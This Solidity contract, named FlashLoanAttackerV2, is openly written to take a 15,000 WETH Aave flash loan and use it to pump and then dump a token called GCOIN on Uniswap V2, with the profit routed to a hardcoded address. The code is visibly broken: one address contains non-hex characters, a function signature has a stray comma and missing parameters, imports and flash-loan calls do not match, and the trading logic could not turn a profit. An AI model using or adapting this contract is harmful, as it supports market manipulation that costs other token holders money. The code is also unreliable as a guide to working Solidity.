// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "aave-v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import "aave-v3-core/contracts/interfaces/IPool.sol";
import "aave/contracts/interfaces/IPool.sol";

interface IUniswapV2Router02 {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    // Include other necessary functions
}

contract FlashLoanAttackerV2 is FlashLoanSimpleReceiverBase {
    address private constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap V2 Router address
    address private constant GCOIN_TOKEN = 0x999237cf10eeD962HFKDLD0985739290JD8306b9D5; // GCOIN token address
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // Wrapped ETH address
    address private constant PROFIT_ADDRESS = 0x41ab5A37f318184e122EF2Bf043d91638ba1Ae31; // Hardcoded address to send profit to

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(UNISWAP_ROUTER);
    IERC20 private GCOINToken = IERC20(GCOIN_TOKEN);

    constructor() FlashLoanSimpleReceiverBase(POOL_ADDRESSES_PROVIDER) {}
    
    IPoolAddressesProvider private constant POOL_ADDRESSES_PROVIDER = IPoolAddressesProvider(0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e);

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
    ) external override returns (bool) {
        require(asset == WETH, "Wrong asset");
        uint256 borrowedAmount = amount; 

        // Convert WETH to ETH for Uniswap swap
        IERC20(WETH).transferFrom(msg.sender, address(this), borrowedAmount);
        IERC20(WETH).approve(UNISWAP_ROUTER, borrowedAmount);
        (bool success,) = WETH.call(abi.encodeWithSignature("withdraw(uint256)", borrowedAmount));
        require(success, "Failed to unwrap WETH");

        // Step 1: Buy GCOIN token - Pump the price
        uint256 minAmountOut = calculateMinAmountOut(borrowedAmount, 5); // 5% slippage tolerance
        address[] memory pathBuy = new address[](2);
        pathBuy[0] = uniswapV2Router.WETH();
        pathBuy[1] = GCOIN_TOKEN;
        uniswapV2Router.swapExactETHForTokens{value: borrowedAmount}(
            minAmountOut,
            pathBuy,
            address(this),
            block.timestamp
        );

        // Step 2: Sell GCOIN token back - Dump the price
        uint256 balanceOfGCOIN = GCOINToken.balanceOf(address(this));
        uint256 minAmountOutSell = calculateMinAmountOut(balanceOfGCOIN, 5); // 5% slippage tolerance
        address[] memory pathSell = new address[](2);
        pathSell[0] = GCOIN_TOKEN;
        pathSell[1] = uniswapV2Router.WETH();
        GCOINToken.approve(UNISWAP_ROUTER, balanceOfGCOIN);
        uniswapV2Router.swapExactTokensForETH(
            balanceOfGCOIN,
            minAmountOutSell,
            pathSell,
            address(this),
            block.timestamp
        );

        // Step 3: Accounting
        uint256 totalDebt = borrowedAmount + premium;
        uint256 ethBalance = address(this).balance;
        require(ethBalance >= totalDebt, "Not enough ETH to repay loan");

        // Calculate profit
        uint256 profit = ethBalance - totalDebt;

        // Repay loan
        (success,) = payable(msg.sender).call{value: totalDebt}("");
        require(success, "Failed to repay loan");

        // Send profit
        if (profit > 0) {
            (success,) = payable(PROFIT_ADDRESS).call{value: profit}("");
            require(success, "Failed to send profit");
        }

        return true;
    }

    // Function to calculate minimum amount out with slippage
    function calculateMinAmountOut(uint256 amountIn, uint256 slippage) private pure returns (uint256) {
        return amountIn * (1000 - slippage) / 1000;
    }

    // Function to initiate the flash loan for 15k WETH
    function startFlashLoan() external {
        address receiverAddress = address(this);
        address[] memory assets = new address[](1);
        assets[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 15000 ether; // Borrow 15k WETH
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // 0 = no debt (flash loan)
        address onBehalfOf = address(this);
        bytes memory params = "";
        uint16 referralCode = 0;

        POOL.flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
    }

    // Fallback function to receive ETH
    receive() external payable {}
}